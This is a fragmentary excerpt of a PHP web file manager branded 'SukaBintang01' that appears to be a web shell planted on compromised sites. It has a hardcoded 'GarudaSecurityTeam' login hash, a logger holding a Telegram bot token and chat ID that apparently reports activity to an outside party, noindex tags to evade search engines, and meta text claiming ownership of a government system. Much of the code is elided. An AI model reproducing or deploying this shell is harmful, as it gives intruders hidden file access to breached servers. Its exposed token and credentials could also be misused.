...
/**
 * System | File Manager SukaBintang01
 * @author SukaBintang01 @2023
 * @email sukabintang84@gmail.com
 * @Menkominfo SukaBintang01
 * @link https://sukabintang01.netlify.app
 */
...
//Application Title
define('APP_TITLE', 'DATA CENTER SUKABINTANG01');
...
$use_auth = true;
$auth_users = array(
    'GarudaSecurityTeam' =>'$2y$10$JL6bpbc9NC2yESGLDAeXqec0MmX2Otl425y6xBCGlsiGQUuRgeb4m', 
);
...
// sample config - https://sukabintang01.netlify.app
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            ...
                            &mdash;&mdash; &copy;
                            <a href="https://sukabintang01.netlify.app" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">SukaBintang01</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://sukabintang01.netlify.app" target="_blank" class="app-v-title"> File Manager SukaBintang01 <?php echo VERSION; ?></a></h3></p>
                        <p>SukaBintang01</p>
                        <p>Mail Us: <a href="mailto:sukabintang84@gmail.com">sukabintang84[at]gmail.com</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://sukabintang01.netlify.app" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="https://sukabintang01.netlify.app" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://sukabintang01.netlify.app" target="_blank" class="float-right text-muted">File Manager SukaBintang01 <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://sukabintang01.netlify.app" target="_blank" class="float-right text-muted">File Manager SukaBintang01 <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'File Manager SukaBintang01<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<head>
    ...
    <meta name="description" content="Web Based System Pemerintah, Data Center SukaBintang01,Pemilik Negara">
    <meta name="author" content="SukaBintang01 @2023">
    ...
    <style>
        body.fm-login-page{ background-image: url('https://cbt.spensapwo.sch.id/download/SukaBintang.png');background-repeat: no-repeat;background-position: center 2%;background-size: 90% auto;}
        ...
        @media screen and (max-width:425px){
            .fm-login-page .card-wrapper{ width:100%;margin:0 auto;margin-top:10%;}
        }
...
function customLogger($message) {
    ...
    $telegramToken = '7479232652:AAFAzES3rh8WAG32oSDhL33xLXrJSkmPAYw';
    $chatId = '6812471405';
...
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="System | File Manager SukaBintang01">
    <meta name="author" content="SukaBintang01 @2023">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($favicon_path) { echo '<link rel="icon" href="'.fm_enc($favicon_path).'" type="image/png">'; } ?>
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'File Manager SukaBintang01';      $tr['en']['AppTitle']           = 'File Manager';
